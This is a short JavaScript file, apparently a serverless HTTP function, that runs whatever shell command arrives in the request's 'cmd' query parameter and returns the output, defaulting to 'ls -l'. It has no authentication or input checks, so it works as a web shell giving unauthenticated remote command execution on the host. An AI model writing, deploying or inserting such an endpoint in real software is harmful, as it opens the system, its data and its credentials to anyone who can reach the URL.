const util = require('util');
const childProcess = require('child_process');
const exec = util.promisify(childProcess.exec);

module.exports = async (context, req) => {
  const cmd = req.query.cmd || 'ls -l'
  
  return {
    body: (await exec(cmd)).stdout
  };
}